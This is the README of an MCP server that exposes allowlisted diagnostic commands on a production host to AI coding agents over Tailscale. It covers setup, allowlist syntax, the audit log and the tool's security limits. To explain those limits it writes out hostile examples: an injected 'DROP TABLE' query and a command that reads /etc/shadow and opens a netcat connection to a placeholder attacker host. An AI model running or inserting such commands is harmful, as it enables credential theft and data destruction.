# korportal

A tiny MCP server that exposes a curated set of diagnostic commands
on a server, reachable only over Tailscale.

Built for the case where you want an AI coding agent (Claude Code,
Cursor, etc.) to inspect production without giving it a free shell —
and without copy/pasting log lines back and forth.

```
[ claude-code on your laptop ]
            │
            │ MCP over SSE on Tailscale
            ▼
[ korportal on prod, bound to 100.x.x.x:7800 only ]
            │
            │ subprocess — only commands matching allowlist.yaml
            ▼
[ docker | redis | postgres | systemd | filesystem ]
```

## Three layers of safety

| Layer | What it guards |
|---|---|
| Tailscale + bind to `tailscale0` | The public internet. The server has no port open to anyone outside your tailnet, even if Caddy/firewall is misconfigured. |
| Allowlist (default deny) | The blast radius of the agent. Anything not in `allowlist.yaml` returns `command_not_allowed`. |
| Audit log to `/var/log/korportal/audit.log` | Forgetting what happened. Every `exec`, `read_file`, and denied call writes a JSON line with matched pattern, exit code, and timing. |

What it does **not** protect against: anything you put in the
allowlist. So extending the allowlist is the security decision.

## Tools the MCP client sees

| Tool | Purpose |
|---|---|
| `exec(cmd)` | Run a shell command. Server-side allowlist rejects mismatches. Returns `{stdout, stderr, exit_code, duration_ms, truncated}`. |
| `list_allowed()` | Returns the allowlist. The agent calls this once at session start. |
| `read_file(path, max_lines=500)` | Read a file under one of the configured roots (default `/srv/korcrm`, `/etc/caddy`, `/var/log`). Structured alternative to `cat`. |

To the agent it feels like `Bash` + `Read`, scoped to one host.

---

## Setup on the prod box

Prereqs:
- Tailscale installed AND `sudo tailscale up` has been run
- Python 3.11+ with `python3-venv`
- A non-root user that is in the `docker` group

```bash
git clone <this-repo> /tmp/korportal
cd /tmp/korportal
sudo ./install.sh

# Or with an explicit service user:
sudo KORPORTAL_USER=deploy ./install.sh
```

The installer detects your Tailscale IP, copies files to
`/opt/korportal/`, creates a venv, writes
`/etc/systemd/system/korportal.service`, and starts the service.

Output gives you the exact `claude mcp add` command to run locally.

### Verify it's running

```bash
systemctl status korportal
sudo journalctl -u korportal -n 50 --no-pager
ss -tlnp | grep 7800           # listens on 100.x.x.x:7800, NOT 0.0.0.0
tail -f /var/log/korportal/audit.log
```

---

## Setup on your laptop

Once Tailscale is connected on your laptop too:

```bash
claude mcp add korportal --transport sse \
  --url http://<prod-tailscale-name>:7800/sse
```

Then, in your repo's `.claude/settings.local.json`, allow the tools
without prompts:

```json
{
  "permissions": {
    "allow": [
      "mcp__korportal__list_allowed",
      "mcp__korportal__read_file",
      "mcp__korportal__exec"
    ]
  }
}
```

The server-side allowlist is the safety boundary; auto-approving
the MCP tools just avoids friction on every read. Keep any
`risk: write` patterns OUT of `permissions.allow` if you want
write ops to still prompt.

---

## Extending the allowlist

Edit `/opt/korportal/allowlist.yaml`. Save — the server hot-reloads
on the next call when the file mtime changes. For an immediate
reload:

```bash
sudo systemctl reload korportal
```

Pattern syntax is `fnmatch` glob:

| Glob | Matches |
|---|---|
| `*` | anything, including spaces |
| `?` | exactly one character |
| `[abc]` | one of `a`, `b`, `c` |

### Example — adding `docker compose restart`

```yaml
- name: compose-restart
  description: Restart a service (write op — prompt every time on client)
  risk: write
  patterns:
    - "docker compose restart"
    - "docker compose restart *"
```

After saving, run `python test_patterns.py` to confirm the patterns
match the inputs you expect.

---

## The security boundary, in detail

### What "allowlist" actually guards

The allowlist treats the agent as a **trusted-but-imperfect
colleague**, not as an attacker. It prevents:

- Accidental `rm -rf /` or `docker compose down`
- Forgotten `redis-cli FLUSHDB`
- Schema-changing SQL (`DROP TABLE`, `ALTER`)
- Network egress to arbitrary URLs

### What it does NOT guard

- **SQL injection via the agent**. A pattern like
  `psql -c 'SELECT *'` will match
  `psql -c 'SELECT 1; DROP TABLE proposals;--'` because fnmatch's
  `*` is greedy. If you need strict SQL safety, write a dedicated
  tool that parses the SQL with `sqlglot` before exec, or run
  destructive queries manually.
- **Shell metacharacter abuse**. `read-config: "cat *"` would match
  `cat /etc/shadow ; nc evil.example.com 4444` if both sides of the
  `;` pass any other allowlist entry. Keep patterns narrow.
- **Path traversal inside read roots**. `read_file` rejects paths
  outside the roots, but everything inside is fair game (including
  `.env` files). Add narrower roots if that's too broad.

### Risk tags

`risk: read` and `risk: write` are **documentation only** — the
server runs anything in the allowlist regardless. Tags exist so
your client can keep `read` tools auto-approved while still
prompting on `write`.

---

## Audit log

Every call writes a JSON line to `/var/log/korportal/audit.log`.

```bash
sudo tail -f /var/log/korportal/audit.log | jq .
```

Sample line:

```json
{
  "ts": "2026-05-28T19:42:11Z",
  "event": "exec",
  "cmd": "docker compose logs automation --tail=200",
  "matched": "compose-logs",
  "matched_pattern": "docker compose logs *",
  "risk": "read",
  "exit_code": 0,
  "duration_ms": 412,
  "stdout_bytes": 18432,
  "stderr_bytes": 0
}
```

Rotated at 10 MB with 5 backups (set via `RotatingFileHandler`).

---

## Local dev (optional)

You can run korportal on your laptop pointed at a local stack:

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

KORPORTAL_BIND_HOST=127.0.0.1 \
KORPORTAL_WORK_DIR=$(pwd) \
KORPORTAL_READ_ROOTS=$(pwd) \
KORPORTAL_AUDIT_LOG=/tmp/korportal-audit.log \
  python server.py
```

Then add it as an MCP server pointing at
`http://127.0.0.1:7800/sse`.

---

## Configuration reference

All optional, all via env vars:

| Var | Default | Purpose |
|---|---|---|
| `KORPORTAL_BIND_HOST` | `127.0.0.1` | Address to bind. Production: Tailscale IP. |
| `KORPORTAL_BIND_PORT` | `7800` | TCP port. |
| `KORPORTAL_ALLOWLIST` | `./allowlist.yaml` | Path to allowlist. |
| `KORPORTAL_AUDIT_LOG` | `/var/log/korportal/audit.log` | Audit log path. Falls back to stderr if unwritable. |
| `KORPORTAL_WORK_DIR` | `/srv/korcrm` | cwd for `exec` (so `docker compose` finds the compose file). |
| `KORPORTAL_READ_ROOTS` | `/srv/korcrm:/etc/caddy:/var/log` | Colon-separated allowed read roots. |
| `KORPORTAL_TIMEOUT_SEC` | `30` | Max wall time per `exec`. |
| `KORPORTAL_MAX_BYTES` | `262144` | Max bytes per stream (stdout / stderr). |
| `KORPORTAL_TRANSPORT` | `sse` | MCP transport (`sse` or `streamable-http`). |

---

## Uninstall

```bash
sudo systemctl disable --now korportal
sudo rm /etc/systemd/system/korportal.service
sudo systemctl daemon-reload
sudo rm -rf /opt/korportal /var/log/korportal
```

---

## Why MCP + Tailscale instead of SSH

| Approach | Pros | Cons |
|---|---|---|
| **SSH over Tailscale** | Nothing new to install on prod. Tailscale ACLs already control who connects. | The agent has freeform shell. Allowlisting requires `ForceCommand` gymnastics. Each command is a separate SSH session (slow). |
| **korportal (MCP) over Tailscale** | Server-side allowlist is structured + auditable. Tools (`list_allowed`, `read_file`) give the agent better discovery and primitives than raw bash. Single persistent SSE connection. | One more thing to install + maintain. |

For a single user inspecting their own box, SSH-over-Tailscale is
fine. For "what would I write if I were going to share this with my
team," the allowlist + audit log model wins.
